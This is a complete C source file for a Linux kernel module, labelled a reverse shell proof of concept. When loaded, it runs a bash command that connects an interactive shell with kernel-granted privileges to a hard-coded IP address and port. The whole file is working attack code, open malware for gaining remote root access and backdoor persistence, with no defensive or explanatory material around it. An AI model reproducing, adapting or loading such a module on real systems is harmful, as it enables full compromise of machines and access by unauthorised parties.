#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("RBT Security");
MODULE_DESCRIPTION("Kernel Module Reverse Shell PoC");
MODULE_VERSION("0.1");

static char *argv[] = {
    "/bin/bash",
    "-c",
    "bash -i >& /dev/tcp/192.168.115.178/6999 0>&1",
    NULL
};

static char *envp[] = {
    "HOME=/",
    "TERM=xterm",
    NULL
};

static int __init reverse_shell_init(void)
{
    printk(KERN_INFO "[+] Reverse shell module loaded\n");
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void)
{
    printk(KERN_INFO "[-] Reverse shell module unloaded\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);

